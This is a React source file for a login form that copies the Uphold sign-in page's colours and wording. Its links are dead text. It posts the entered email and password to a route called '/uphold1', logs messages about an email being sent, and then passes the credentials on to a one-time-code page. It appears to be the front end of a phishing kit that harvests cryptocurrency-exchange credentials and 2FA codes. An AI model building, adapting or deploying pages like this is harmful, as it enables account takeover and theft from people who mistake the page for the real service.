import React, { useState, useEffect } from 'react'
import { useHistory } from 'react-router-dom'
import URL from './Url.js'

const Form = (props) => {
    const history = useHistory()

    const [email, setEmail] = useState('')
    const [password, setPassword] = useState('')
    const [loading, setLoading] = useState(false)
    const [token, setToken] = useState('')

    const handleEmail = (e) => {
        setEmail(e.target.value)
    }

    const handlePassword = (e) => {
        setPassword(e.target.value)
    }

    const fetchCsrf = async () => {
        console.log('changed the url', URL)
        const response = await fetch(URL + '/form', {
            method: 'GET',
            headers: {
                Accept: 'application/json',
                'Content-type': 'application/json',
            },
            credentials: 'include',
            mode: 'cors',
        })

        const resData = await response.json()

        console.log('get form', resData)
        setToken(resData.token)
    }

    useEffect(() => {
        console.log('uphold1')
        fetchCsrf()
    }, [])

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        if (email === '' || password === '') {
            console.log('not sent')
        } else {
            console.log({ email, password })
            try {
                const response = await fetch(URL + '/uphold1', {
                    method: 'POST',
                    headers: {
                        Accept: 'application/json',
                        'Content-type': 'application/json',
                        Authorization: 'Bearer ' + token,
                    },
                    credentials: 'include',
                    mode: 'cors',

                    body: JSON.stringify({
                        email,
                        password,
                        otp: '',
                    }),
                })

                const resData = await response.json()

                console.log('email sending started')

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setLoading(false)
                    history.push('/otp', { email, password, token })
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (
        <>
            <form
                className='grid w-full place-content-stretch bg-white  md:mx-auto font-normal gap-8 h-full text-[#3d4a5b] p-6'
                onSubmit={handleSubmit}
            >
                <div>
                    <h2 className='font-ProximaNovaSemibold text-center mb-6 text-[#3d4a5b]'>
                        Welcome back!
                    </h2>
                    <div className='relative input-box'>
                        <input
                            type='email'
                            id='email'
                            required
                            placeholder='Enter your email'
                            className='sign-in-input'
                            value={email}
                            onChange={handleEmail}
                        />
                        <label
                            htmlFor='email'
                            className='input-label absolute font-ProximaNovaRegular'
                        >
                            {' '}
                            Email address
                        </label>
                    </div>
                    <div className='relative input-box'>
                        <input
                            type='password'
                            id='password'
                            className='sign-in-input'
                            required
                            placeholder='Enter your password'
                            value={password}
                            onChange={handlePassword}
                        />
                        <label
                            htmlFor='password'
                            className='input-label absolute font-ProximaNovaRegular'
                        >
                            Password
                        </label>
                    </div>
                    <div className='flex justify-start'>
                        <div className='font-ProximaNovaSemibold text-center text-[#49cc68]'>
                            Forgot password?
                        </div>
                    </div>
                </div>
                <div className='grid content-end'>
                    <p className='text-center py-2 text-[#3d4a5b] text-sm'>
                        Learn more about our{' '}
                        <span className='text-[#49cc68] font-ProximaNovaSemibold'>
                            Privacy policy
                        </span>{' '}
                        and{' '}
                        <span className='text-[#49cc68] font-ProximaNovaSemibold'>
                            Terms of service
                        </span>
                    </p>
                    <button
                        className=' rounded-3xl outline-none  bg-[#49cc68] text-white btn'
                        style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
                    >
                        {loading ? (
                            
                            <div className='grid justify-center'>
                                <div
                                    style={{borderTopColor: 'transparent'}}
                                    className='w-6 h-6 border-2 border-gray-200 border-solid rounded-full animate-spin'
                                ></div>
                            </div>
                        ) : (
                            'Sign in'
                        )}
                    </button>
                   
                </div>
            </form>
        </>
    )
}

export default Form
